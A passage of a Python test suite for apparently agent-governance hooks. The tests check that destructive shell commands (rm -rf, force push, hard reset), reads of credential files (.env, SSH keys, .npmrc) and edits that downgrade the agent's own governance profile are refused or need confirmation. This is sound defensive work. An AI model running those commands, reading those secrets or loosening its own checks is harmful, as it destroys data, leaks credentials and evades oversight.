    apply_plan(emitter.plan(build_surface(governed), governed), governed)
    data = json.loads(settings.read_text(encoding="utf-8"))

    assert data["model"] == "opus"
    commands = [h["command"] for entry in data["hooks"]["SessionStart"] for h in entry["hooks"]]
    assert "echo maison" in commands
    # The legacy activation hook is superseded, not stacked on top of.
    assert "grimoire standard activation-context" not in commands
    assert commands.count("grimoire-hook --host claude --event SessionStart") == 1
    # The superseded invocation is migrated, not stacked beside the new one.
    assert not [c for c in commands if c.startswith("grimoire host hook")]
    assert "Read(./privé)" in data["permissions"]["deny"]


def test_repeated_sync_never_stacks_hook_entries(governed: Path) -> None:
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    for _ in range(3):
        apply_plan(emitter.plan(build_surface(governed), governed), governed)
    data = json.loads((governed / ".claude/settings.json").read_text(encoding="utf-8"))
    assert len(data["hooks"]["Stop"]) == 1


# ── Decisions ────────────────────────────────────────────────────────────────


def test_tool_classification_reads_both_host_vocabularies() -> None:
    assert classify_tool("Bash", {"command": "rm -rf build"}).destructive_reason
    assert classify_tool("run_in_terminal", {"command": "rm -rf build"}).destructive_reason
    assert classify_tool("replace_string_in_file", {"filePath": "a.py"}).family == "write"
    assert classify_tool("Read", {"file_path": "app/.env"}).secret_target


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        # Red: a branch name containing "-f-" is not the -f flag.
        ("git push -u origin docs/rejeu-lot-f-2026-09-17", False),
        ("git push origin feature-force", False),
        ("git push -u origin branch", False),
        # Green: the flag, in every shape it can take.
        ("git push --force", True),
        ("git push -f origin main", True),
        ("git push origin main -f", True),
        ("git push --force-with-lease", True),
        ("git push --force-with-lease=origin/main", True),
        ("git push --force-if-includes", True),
        # Bundled short options: -f combined with another single-letter flag.
        ("git push -uf origin branch", True),
        ("git push -fu origin branch", True),
    ],
)
def test_force_push_detection_matches_the_flag_not_a_branch_name(command: str, expected: bool) -> None:
    """Regression for the 2026-09-17 false positive.

    The old pattern's trailing word-boundary check after --force/-f treats a
    hyphen as a token boundary, same as whitespace, so a branch name like
    docs/rejeu-lot-f-2026-09-17 (containing -f-) read as a force push and the
    PreToolUse guard refused a plain git push -u.
    """
    facts = classify_tool("Bash", {"command": command})
    assert (facts.destructive_reason == "force push") is expected


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("git reset --hard", True),
        ("git reset --hard HEAD~1", True),
        ("git reset --soft HEAD~1", False),
        # Red under the old boundary-after-flag anchor: a hyphen right after
        # the flag reads as a token boundary just like whitespace does.
        ("git reset --hard-2", False),
    ],
)
def test_hard_reset_detection_requires_the_flag_to_stand_alone(command: str, expected: bool) -> None:
    facts = classify_tool("Bash", {"command": command})
    assert (facts.destructive_reason == "hard reset") is expected


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("git checkout -- .", True),
        # Red: restoring a single dotfile is not discarding the whole tree,
        # but the old pattern had no boundary after the literal dot at all.
        ("git checkout -- .gitignore", False),
        ("git checkout -- .editorconfig", False),
    ],
)
def test_checkout_discard_all_requires_the_dot_to_stand_alone(command: str, expected: bool) -> None:
    facts = classify_tool("Bash", {"command": command})
    assert (facts.destructive_reason == "discard all working-tree changes") is expected


def test_a_host_with_a_permission_table_does_not_pay_a_process_per_read() -> None:
    """`Read` in the matcher means a hook process on every file read (~307 ms).

    Credential paths are already refused by the declarative deny rules on a host
    that has them, so intercepting reads there buys nothing and taxes every
    session. Shell access to the same files stays covered: `Bash` is in the
    matcher for the execute family.
    """
    hook = HookSpec(
        event=HookEvent.PRE_TOOL_USE,
        decision="grimoire.tool-policy",
        matcher=("execute", "write", "secret"),
    )
    trimmed = _matcher(hook, covered=frozenset({"secret"}))
    assert "Read" not in trimmed
    assert "Bash" in trimmed and "Edit" in trimmed


def test_a_host_without_a_permission_table_keeps_intercepting_reads() -> None:
    hook = HookSpec(
        event=HookEvent.PRE_TOOL_USE,
        decision="grimoire.tool-policy",
        matcher=("execute", "write", "secret"),
    )
    assert "Read" in _matcher(hook)


def test_every_credential_family_is_declared_in_both_forms() -> None:
    """The regex and the deny glob drifted apart once; this is what caught it.

    Three families (`.npmrc`, `credentials.*`, `service-account*.json`) had a
    detection pattern and no declarative counterpart, so they were unprotected
    on the side that costs nothing.
    """
    for rule in SECRET_RULES:
        assert rule.pattern, f"{rule.name} sans motif de détection"
        assert rule.globs, f"{rule.name} sans glob déclaratif"

    deny = default_permissions("governed").deny
    for glob in secret_read_globs():
        assert f"read:{glob}" in deny, f"{glob} absent des règles deny"


@pytest.mark.parametrize(
    "probe",
    [
        ".env",
        "app/.env.local",
        "app/.npmrc",
        "x/.pypirc",
        "~/.ssh/id_ecdsa",
        "secrets/token",
        "certs/a.p12",
        "k/credentials.json",
        "sa/service-account-prod.json",
    ],
)
def test_each_credential_family_is_actually_detected(probe: str) -> None:
    assert classify_tool("Read", {"file_path": probe}).secret_target, probe


def test_secret_detection_survives_a_windows_separator() -> None:
    """A Windows host hands over `app\\.env`; a `/`-only anchor lets it through."""
    assert classify_tool("Read", {"file_path": r"app\.env"}).secret_target
    assert classify_tool("Read", {"file_path": r"C:\proj\secrets\token.txt"}).secret_target
    assert not classify_tool("Read", {"file_path": r"docs\environment.md"}).secret_target


def test_destructive_and_secret_actions_are_refused(governed: Path) -> None:
    deny = decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE, project_root=governed, tool_name="Bash", tool_input={"command": "rm -rf src"}
        )
    )
    assert deny.outcome is Outcome.DENY
    secret = decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE, project_root=governed, tool_name="Read", tool_input={"file_path": ".env"}
        )
    )
    assert secret.outcome is Outcome.DENY


def test_read_only_calls_are_not_slowed_down(governed: Path) -> None:
    decision = decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE, project_root=governed, tool_name="Read", tool_input={"file_path": "README.md"}
        )
    )
    assert decision.outcome is Outcome.ALLOW
    assert decision.detail == {}


# ── Standard profile downgrade guard (fix/profile-downgrade-guard) ──────────
#
# `_grimoire/standard/standard-profile.yaml`'s `profile:` field selects which
# rule set `_risk_profile` applies (see `tool_policy._RISK_BY_PROFILE`). Any
# write that weakens it therefore relaxes every threshold the standard
# enforces, without touching a single rule — and nothing guarded that field
# before this. Design: `_scratch/party-oss/gouvernance.md`, idea A.

_PROFILE_YAML_RELPATH = "_grimoire/standard/standard-profile.yaml"


def test_profile_downgrade_by_edit_asks_for_confirmation(production: Path) -> None:
    path = production / _PROFILE_YAML_RELPATH
    decision = decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE,
            project_root=production,
            tool_name="Edit",
            tool_input={
                "file_path": str(path),
                "old_string": "profile: production",
                "new_string": "profile: starter",
            },
        )
    )
    assert decision.outcome is Outcome.ASK
    assert "production" in decision.reason
    assert "starter" in decision.reason


def test_profile_downgrade_by_write_asks_for_confirmation(production: Path) -> None:
    path = production / _PROFILE_YAML_RELPATH
    decision = decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE,
            project_root=production,
            tool_name="Write",
            tool_input={"file_path": str(path), "content": "profile: starter\n"},
        )
    )
    assert decision.outcome is Outcome.ASK


def test_profile_downgrade_by_shell_command_asks_for_confirmation(production: Path) -> None:
    decision = decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE,
            project_root=production,
            tool_name="Bash",
            tool_input={
                "command": (
                    "sed -i 's/profile: production/profile: starter/' "
                    f"{_PROFILE_YAML_RELPATH}"
                )
            },
        )
    )
    assert decision.outcome is Outcome.ASK


def test_profile_upgrade_is_allowed(governed: Path) -> None:
    path = governed / _PROFILE_YAML_RELPATH
    decision = decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE,
            project_root=governed,
            tool_name="Edit",
            tool_input={
                "file_path": str(path),
                "old_string": "profile: governed",
                "new_string": "profile: production",
            },
        )
    )
    assert decision.outcome is Outcome.ALLOW


def test_profile_written_with_same_value_is_allowed(governed: Path) -> None:
    path = governed / _PROFILE_YAML_RELPATH
    decision = decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE,
            project_root=governed,
            tool_name="Write",
            tool_input={"file_path": str(path), "content": "profile: governed\n"},
        )
    )
    assert decision.outcome is Outcome.ALLOW


def test_other_standard_yaml_file_is_unaffected_by_the_profile_guard(governed: Path) -> None:
    """Scope guard (design risk (b)): only `standard-profile.yaml` is watched."""
    policies_path = governed / "_grimoire/standard/policies.yaml"
    decision = decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE,
            project_root=governed,
            tool_name="Write",
            tool_input={"file_path": str(policies_path), "content": "profile: starter\nrules: []\n"},
        )
    )
    assert decision.outcome is Outcome.ALLOW


def test_profile_guard_never_ranks_a_profile_off_target(governed: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Budget guard: an ordinary ``Edit`` elsewhere must never pay for the
    lazy ``profile_rank`` import/call the downgrade guard only needs once it
    has already matched ``standard-profile.yaml`` by a plain string
    comparison. A coordinator-reported latency concern (an off-target `Edit`
    measured ~90ms vs a ~60ms `Read` baseline) turned out, on a proper
    before/after A/B against ``origin/main`` (7 runs each, same machine), to
    be pre-existing engine-evaluation cost unrelated to this guard (delta
    within a few ms, noise-level) — this test is the standing proof that stays
    true regardless of what the ambient noise does.
    """
    import grimoire.core.agentic_standard as agentic_standard

    def _must_not_be_called(profile_id: str) -> int:
        raise AssertionError("profile_rank must not be called for a call that never targets standard-profile.yaml")

    monkeypatch.setattr(agentic_standard, "profile_rank", _must_not_be_called)
    path = governed / "notes.md"
    decision = decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE,
            project_root=governed,
            tool_name="Edit",
            tool_input={"file_path": str(path), "old_string": "a", "new_string": "b"},
        )
    )
    assert decision.outcome is Outcome.ALLOW


def test_post_tool_use_logs_bash_test_run_and_file_write_events(governed: Path) -> None:
    """Issue #582 lot G2 : le hook consigne, l'agent n'a plus à recopier."""
    from grimoire.core.standard_checks.evidence_journal import read_evidence_log

    decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=governed,
            tool_name="Bash",
            tool_input={"command": "git status"},
            tool_response={"exit_code": 0},
        )
    )
    decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=governed,
            tool_name="Bash",
            tool_input={"command": "pytest -q"},
            tool_response={"exit_code": 1},
        )
    )
    decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=governed,
            tool_name="Write",
            tool_input={"file_path": "src/foo.py"},
        )
    )
    entries = read_evidence_log(governed, "bootstrap")
    assert [e["type"] for e in entries] == ["bash", "test_run", "file_write"]
    assert entries[0]["command"] == "git status" and entries[0]["exit_code"] == 0
    assert entries[1]["command"] == "pytest -q" and entries[1]["exit_code"] == 1
    assert entries[2]["path"] == "src/foo.py"


def test_post_tool_use_counts_a_mutating_bash_call_but_not_a_read_only_one(governed: Path) -> None:
    """Défaut #1 (suite) : une fois Bash reçu par ce hook (matcher élargi ci-dessus),

    seule une commande qui mute réellement doit incrémenter le compteur que
    ``evidence_gate.py`` lit pour refuser une clôture hors tâche — un ``git
    status`` en lecture seule ne doit jamais compter, et ni l'un ni l'autre ne
    doit renvoyer le rappel « Écriture enregistrée », réservé aux vrais
    ``ActionKind.FILE_WRITE``.
    """
    from grimoire.policies.session_state import session_mutations

    read_only = decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=governed,
            tool_name="Bash",
            tool_input={"command": "git status"},
            session_id="sess-mut",
        )
    )
    assert read_only.context == ""
    assert session_mutations(governed, "sess-mut") == 0

    mutating = decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=governed,
            tool_name="Bash",
            tool_input={"command": "sed -i 's/a/b/' src/foo.py"},
            session_id="sess-mut",
        )
    )
    assert mutating.context == ""
    assert session_mutations(governed, "sess-mut") == 1


def test_post_tool_use_journal_write_stays_under_the_30ms_budget(governed: Path) -> None:
    """Issue #582 lot G2 : le hook tourne à chaque outil, le budget est serré.

    Seuil large (30 ms) contre une mesure d'un ordre de grandeur inférieur :
    ce qui est borné est une régression de nature (un appel réseau, un
    ``resolve_need`` qui relit ``project-context.yaml`` — voir le choix
    documenté dans ``evidence_journal``, pas un ``resolve_need`` par appel),
    pas le jitter de la machine. Le chiffre mesuré est rapporté dans la PR.
    """
    import statistics
    import time

    samples = []
    for i in range(30):
        started = time.perf_counter()
        decide_evidence_trace(
            HookInput(
                event=HookEvent.POST_TOOL_USE,
                project_root=governed,
                tool_name="Bash",
                tool_input={"command": f"pytest -q --run={i}"},
                tool_response={"exit_code": 0},
            )
        )
        samples.append(time.perf_counter() - started)
    assert statistics.median(samples) < 0.03, f"médiane {statistics.median(samples) * 1000:.2f} ms"


def test_post_tool_use_never_logs_on_an_unenrolled_project(project: Path) -> None:
    from grimoire.core.standard_checks.evidence_journal import read_evidence_log

    decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE, project_root=project, tool_name="Bash", tool_input={"command": "pytest -q"}
        )
    )
    assert read_evidence_log(project, "bootstrap") == []


def test_post_tool_use_logs_a_delegation_call_silently(governed: Path) -> None:
    """#657 : mesurer la délégation sans jamais coûter un jeton.

    ``Task`` est le nom historique de l'outil de délégation de Claude Code,
    ``Agent`` son renommage récent — les deux doivent être reconnus. La
    décision ne doit renvoyer aucun contexte (zéro coût pour le LLM) alors
    même que l'appel est journalisé dans le TraceLedger existant.
    """
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.traces.ledger import DELEGATION_TAG, TraceLedger

    for tool_name in ("Task", "Agent"):
        decision = decide_evidence_trace(
            HookInput(
                event=HookEvent.POST_TOOL_USE,
                project_root=governed,
                tool_name=tool_name,
                tool_input={
                    "subagent_type": "general-purpose",
                    "description": "Chercher où la délégation est journalisée",
                    "model": "claude-sonnet-4-6",
                },
                session_id="sess-1",
                host="claude",
            )
        )
        assert decision == Decision()

    ledger = TraceLedger(governed / TRACES_DIR)
    delegations = [t for t in ledger.list_traces() if DELEGATION_TAG in t.tags]
    assert len(delegations) == 2
    assert {t.agent_id for t in delegations} == {"general-purpose"}
    assert {t.model for t in delegations} == {"claude-sonnet-4-6"}
    assert all(t.host_id == "claude" for t in delegations)


def test_post_tool_use_logs_a_delegation_call_without_a_model(governed: Path) -> None:
    """Un appel de délégation sans modèle explicite reste journalisé — pas d'erreur, modèle vide."""
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.traces.ledger import DELEGATION_TAG, TraceLedger

    decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=governed,
            tool_name="Task",
            tool_input={"subagent_type": "Explore", "description": "chercher un fichier"},
        )
    )
    ledger = TraceLedger(governed / TRACES_DIR)
    delegations = [t for t in ledger.list_traces() if DELEGATION_TAG in t.tags]
    assert len(delegations) == 1
    assert delegations[0].agent_id == "Explore"
    assert delegations[0].model == ""


def test_post_tool_use_reads_a_copilot_delegation_nested_under_tool_specific_data(governed: Path) -> None:
    """Défaut #2 : les vraies sessions Copilot de cette machine portent

    ``agentName``/``modelName`` sous ``toolSpecificData``, pas à plat dans
    ``tool_input`` (preuve : ``_scratch/delegation-audit/delegation_audit.py``
    l.393-397). Sans ``agentName`` dans ``_DELEGATION_AGENT_KEYS`` et sans lire
    sous ``toolSpecificData``, un tel appel réel se journalisait sous
    ``agent_id == "(sans nom)"`` et modèle vide.
    """
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.traces.ledger import DELEGATION_TAG, TraceLedger

    decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=governed,
            tool_name="runSubagent",
            tool_input={"toolSpecificData": {"agentName": "expert-playwright", "modelName": "gpt-5"}},
        )
    )
    ledger = TraceLedger(governed / TRACES_DIR)
    delegations = [t for t in ledger.list_traces() if DELEGATION_TAG in t.tags]
    assert len(delegations) == 1
    assert delegations[0].agent_id == "expert-playwright"
    assert delegations[0].model == "gpt-5"


def test_post_tool_use_never_falls_back_to_the_full_prompt_for_desc_tag(governed: Path) -> None:
    """Défaut #3 : ``prompt`` n'est plus un repli pour la description.

    Avant #657 (suite), un appel sans ``description``/``task`` explicite
    faisait partir les 160 premiers caractères du prompt complet dans un tag
    ``desc:`` — exporté tel quel par ``_to_langfuse_trace`` et OTel. Un appel
    sans description ne doit plus produire aucun tag ``desc:``.
    """
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.traces.ledger import DELEGATION_TAG, TraceLedger

    decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=governed,
            tool_name="Task",
            tool_input={
                "subagent_type": "general-purpose",
                "prompt": "Un très long prompt qui ne doit jamais être journalisé tel quel...",
            },
        )
    )
    ledger = TraceLedger(governed / TRACES_DIR)
    delegations = [t for t in ledger.list_traces() if DELEGATION_TAG in t.tags]
    assert len(delegations) == 1
    assert not [tag for tag in delegations[0].tags if tag.startswith("desc:")]


def test_delegation_trace_id_never_relies_on_next_id_and_its_journal_reread(
    governed: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Défaut #4, preuve déterministe (pas un pari sur l'ordre d'exécution).

    ``TraceLedger._next_id`` relit tout le journal et calcule ``len(existing)
    + 1`` : sans ``trace_id`` explicite, ``_record_delegation`` retombait sur
    cette méthode, et deux lectures concurrentes du même état du journal
    (deux ``Agent`` dans un même message, avant que l'une des deux écritures
    n'ait eu lieu) produisent alors le même id. On rend cette course
    déterministe en figeant ``_next_id`` sur une valeur fixe : le correctif
    doit ne jamais l'appeler pour une délégation, donc jamais produire cette
    valeur ni collisionner.
    """
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.traces.ledger import DELEGATION_TAG, TraceLedger

    monkeypatch.setattr(TraceLedger, "_next_id", lambda self, run_id: "TRC-RACE-WOULD-COLLIDE")

    for _ in range(2):
        decide_evidence_trace(
            HookInput(
                event=HookEvent.POST_TOOL_USE,
                project_root=governed,
                tool_name="Task",
                tool_input={"subagent_type": "general-purpose", "description": "recherche"},
                session_id="sess-concurrent",
            )
        )
    ledger = TraceLedger(governed / TRACES_DIR)
    delegations = [t for t in ledger.list_traces() if DELEGATION_TAG in t.tags]
    assert len(delegations) == 2
    assert delegations[0].id != delegations[1].id
    assert "TRC-RACE-WOULD-COLLIDE" not in {t.id for t in delegations}


def test_post_tool_use_does_not_log_a_non_delegating_tool_call(governed: Path) -> None:
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.traces.ledger import DELEGATION_TAG, TraceLedger

    decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE, project_root=governed, tool_name="Read", tool_input={"file_path": "README.md"}
        )
    )
    ledger = TraceLedger(governed / TRACES_DIR)
    assert not [t for t in ledger.list_traces() if DELEGATION_TAG in t.tags]


def test_post_tool_use_never_logs_a_delegation_on_an_unenrolled_project(project: Path) -> None:
    from grimoire.core.standard_generation import TRACES_DIR

    decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=project,
            tool_name="Task",
            tool_input={"subagent_type": "general-purpose", "description": "x"},
        )
    )
    assert not (project / TRACES_DIR / "traces.jsonl").exists()


def test_a_delegation_write_failure_never_breaks_the_hook(governed: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Journalisation best-effort : une erreur d'écriture ne doit jamais faire échouer PostToolUse."""
    from grimoire.traces.ledger import TraceLedger

    def _boom(self: TraceLedger, **kwargs: object) -> None:
        raise OSError("disque plein")

    monkeypatch.setattr(TraceLedger, "record", _boom)
    decision = decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=governed,
            tool_name="Task",
            tool_input={"subagent_type": "general-purpose", "description": "x"},
        )
    )
    assert decision == Decision()


def test_run_hook_records_a_claude_code_delegation_call_with_no_extra_context(governed: Path) -> None:
    """End-to-end through the wire layer: normalise -> decide -> ledger -> render.

    A realistic Claude Code ``PostToolUse`` payload for the ``Agent`` tool
    call — ``subagent_type``/``description``/``model``/``prompt`` in
    ``tool_input``, per Claude Code's documented delegation tool schema.
    The rendered verdict must be empty: this is measurement, not governance,
    and the calling session must not spend a single token reading it.
    """
    from grimoire.bridges.schemas import HostId
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.traces.ledger import DELEGATION_TAG, TraceLedger

    payload = {
        "hook_event_name": "PostToolUse",
        "session_id": "sess-cc-1",
        "cwd": str(governed),
        "tool_name": "Agent",
        "tool_input": {
            "subagent_type": "general-purpose",
            "description": "Chercher où la délégation est journalisée",
            "prompt": "Un très long prompt qui ne doit jamais être journalisé tel quel...",
            "model": "claude-sonnet-4-6",
        },
        "tool_response": {"content": "..."},
    }
    rendered, decision, _hook = run_hook(payload, host_id=HostId.CLAUDE_CODE_CLI)
    assert rendered == {}
    assert decision.context == ""

    ledger = TraceLedger(governed / TRACES_DIR)
    delegations = [t for t in ledger.list_traces() if DELEGATION_TAG in t.tags]
    assert len(delegations) == 1
    assert delegations[0].agent_id == "general-purpose"
    assert delegations[0].model == "claude-sonnet-4-6"
    assert delegations[0].host_id == HostId.CLAUDE_CODE_CLI.value


def test_run_hook_records_a_copilot_delegation_call_without_extra_context(governed: Path) -> None:
    """Same path for a guessed Copilot payload shape.

    Copilot's ``runSubagent``/``agent`` tool input has not been confirmed
    against a live payload (see this PR's ``grimoire-uncertainties``); this
    only proves the hook recognises the tool name, reads the fallback field
    names it defines, and never raises or injects context either way.
    """
    from grimoire.bridges.schemas import HostId
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.traces.ledger import DELEGATION_TAG, TraceLedger

    payload = {
        "hookEventName": "PostToolUse",
        "sessionId": "sess-copilot-1",
        "cwd": str(governed),
        "toolName": "runSubagent",
        "toolInput": {"agentType": "expert-playwright", "model": "gpt-5"},
    }
    rendered, decision, _hook = run_hook(payload, host_id=HostId.GITHUB_COPILOT)
    assert rendered == {}
    assert decision.context == ""

    ledger = TraceLedger(governed / TRACES_DIR)
    delegations = [t for t in ledger.list_traces() if DELEGATION_TAG in t.tags]
    assert len(delegations) == 1
    assert delegations[0].agent_id == "expert-playwright"
    assert delegations[0].model == "gpt-5"


def _set_task_in_progress(root: Path) -> None:
    """Flip the ``bootstrap`` card to ``in_progress`` on disk.

    A literal ``status: "proposed"`` string replace matched only the old
    static template's quoting style. ADR-007's ledger-backed board goes
    through ``ruamel.yaml`` (unquoted plain scalars), so this edits the
    parsed structure instead of depending on either serializer's formatting.
    """
    import io

    from ruamel.yaml import YAML

    board_path = root / "_grimoire/standard/task-board.yaml"
    yaml = YAML()
    data = yaml.load(board_path.read_text(encoding="utf-8"))
    for task in data.get("tasks", []):
        if task.get("task_id") == "bootstrap":
            task["status"] = "in_progress"
    stream = io.StringIO()
    yaml.dump(data, stream)
    board_path.write_text(stream.getvalue(), encoding="utf-8")


def test_red_gates_block_a_governed_closure(governed: Path) -> None:
    _set_task_in_progress(governed)
    (governed / "_grimoire-output/context/bootstrap/context-bundle.yaml").unlink(missing_ok=True)
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed))
    assert decision.outcome is Outcome.BLOCK
    assert "non terminée" in decision.reason


def test_a_block_never_repeats_itself(governed: Path) -> None:
    _set_task_in_progress(governed)
    (governed / "_grimoire-output/context/bootstrap/context-bundle.yaml").unlink(missing_ok=True)
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed, stop_active=True))
    assert decision.outcome is Outcome.ALLOW


def test_an_unenrolled_project_is_never_blocked(project: Path) -> None:
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=project))
    assert decision.outcome is Outcome.ALLOW
    assert decision.detail["skipped"] == "project_not_enrolled"


def test_a_green_gate_on_a_proposed_task_says_it_protects_nothing(governed: Path) -> None:
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed))
    assert decision.outcome is Outcome.ALLOW
    assert "ne protège rien" in decision.context


def test_a_broken_governed_project_blocks_once_and_says_why(governed: Path) -> None:
    """Un gate qu'on ne sait pas évaluer n'est pas un gate vert.

    Avant : un task-board illisible rendait ALLOW avec un contexte que l'hôte
    n'affiche pas sur Stop — la clôture passait, en silence, précisément dans
    le profil qui promet de la refuser.
    """
    (governed / "_grimoire/standard/task-board.yaml").write_text("[oups", encoding="utf-8")
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed))
    assert decision.outcome is Outcome.BLOCK
    assert "non évaluables" in decision.reason
    assert "task-board.yaml" in decision.reason
    # ...et ne rend jamais la session inquittable : le second Stop passe.
    again = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed, stop_active=True))
    assert again.outcome is Outcome.ALLOW


def test_a_broken_unguarded_project_is_told_not_blocked(project: Path) -> None:
    setup_standard_profile(project, profile_id="orchestrated", task_id="bootstrap")
    (project / "_grimoire/standard/task-board.yaml").write_text("[oups", encoding="utf-8")
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=project))
    assert decision.outcome is Outcome.ALLOW
    assert "non évaluables" in decision.context


# ── Done gate (issue #644) ───────────────────────────────────────────────────


def _make_gates_green(root: Path, task_id: str = "bootstrap") -> None:
    """Scaffold the artifacts ``check_evidence_gates`` requires for *task_id*.

    The done gate is orthogonal to the red/green evidence gate — it must be
    tested against a governed closure that would otherwise be *allowed*, not
    against the red-gate fixtures the tests above already cover.
    """
    from grimoire.core.standard_task_scaffold import scaffold_task_artifacts

    scaffold_task_artifacts(root, task_id=task_id)


def _append_bash_event(root: Path, task_id: str, command: str, exit_code: int | None) -> None:
    from grimoire.core.standard_checks.evidence_journal import append_evidence_event, build_bash_event

    append_evidence_event(root, task_id, build_bash_event(command, exit_code=exit_code))


def _append_write_event(root: Path, task_id: str, path: str) -> None:
    from grimoire.core.standard_checks.evidence_journal import append_evidence_event, build_file_write_event

    append_evidence_event(root, task_id, build_file_write_event(path))


def test_done_gate_says_nothing_without_any_mutation(governed: Path) -> None:
    _set_task_in_progress(governed)
    _make_gates_green(governed)
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed))
    assert decision.outcome is Outcome.ALLOW
    assert decision.context == ""
    assert decision.detail["done_gate"] == {
        "stale": False,
        "reason": "no_mutation",
        "enforce": False,
        "blocked": False,
        "capped": False,
        "command_hint": "",
        "last_mutation_ts": "",
    }


def test_done_gate_veto_dur_a_fresh_green_check_after_the_mutation_is_never_blocked(governed: Path) -> None:
    """Veto dur : même en profil enforce, un check frais vert postérieur à la mutation gagne toujours."""
    import os

    os.environ["GRIMOIRE_DONE_GATE"] = "enforce"
    try:
        _set_task_in_progress(governed)
        _make_gates_green(governed)
        _append_write_event(governed, "bootstrap", "src/foo.py")
        _append_bash_event(governed, "bootstrap", "pytest -q", 0)
        decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed, session_id="s-veto"))
    finally:
        del os.environ["GRIMOIRE_DONE_GATE"]
    assert decision.outcome is Outcome.ALLOW
    assert decision.detail["done_gate"]["stale"] is False
    assert decision.detail["done_gate"]["reason"] == "green_check_after_mutation"


def test_done_gate_flags_a_stale_mutation_but_stays_shadow_by_default(governed: Path) -> None:
    _set_task_in_progress(governed)
    _make_gates_green(governed)
    _append_bash_event(governed, "bootstrap", "pytest -q", 0)
    _append_write_event(governed, "bootstrap", "src/foo.py")
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed, session_id="s-shadow"))
    assert decision.outcome is Outcome.ALLOW
    assert decision.detail["done_gate"]["stale"] is True
    assert decision.detail["done_gate"]["blocked"] is False
    assert decision.detail["done_gate"]["enforce"] is False
    assert "gate « fini »" in decision.context


def test_done_gate_blocks_when_the_enforce_option_is_set(governed: Path) -> None:
    import os

    os.environ["GRIMOIRE_DONE_GATE"] = "enforce"
    try:
        _set_task_in_progress(governed)
        _make_gates_green(governed)
        _append_bash_event(governed, "bootstrap", "pytest -q", 0)
        _append_write_event(governed, "bootstrap", "src/foo.py")
        decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed, session_id="s-enf"))
    finally:
        del os.environ["GRIMOIRE_DONE_GATE"]
    assert decision.outcome is Outcome.BLOCK
    assert decision.detail["done_gate"]["blocked"] is True
    assert "postérieure au dernier check vert" in decision.reason
    assert "pytest -q" in decision.reason


def test_done_gate_never_fires_when_stop_is_already_active(governed: Path) -> None:
    import os

    os.environ["GRIMOIRE_DONE_GATE"] = "enforce"
    try:
        _set_task_in_progress(governed)
        _make_gates_green(governed)
        _append_bash_event(governed, "bootstrap", "pytest -q", 0)
        _append_write_event(governed, "bootstrap", "src/foo.py")
        decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed, stop_active=True))
    finally:
        del os.environ["GRIMOIRE_DONE_GATE"]
    assert decision.outcome is Outcome.ALLOW
    assert "done_gate" not in decision.detail


def test_done_gate_caps_a_task_cooldown_and_a_session_total(governed: Path) -> None:
    """Un blocage par tâche toutes les 60 s, trois par session — au-delà, capped sans jamais bloquer."""
    import os

    from grimoire.hosts.decisions.done_gate import evaluate_done_gate

    os.environ["GRIMOIRE_DONE_GATE"] = "enforce"
    try:
        _set_task_in_progress(governed)
        _make_gates_green(governed)
        _append_bash_event(governed, "bootstrap", "pytest -q", 0)
        _append_write_event(governed, "bootstrap", "src/foo.py")
        hook = HookInput(event=HookEvent.STOP, project_root=governed, session_id="s-caps")

        v1 = evaluate_done_gate(hook, "bootstrap", "governed", now_iso="2026-01-01T00:00:00+00:00")
        assert v1.blocked is True
        assert v1.capped is False

        # 30 s later: cooldown (60 s) still open.
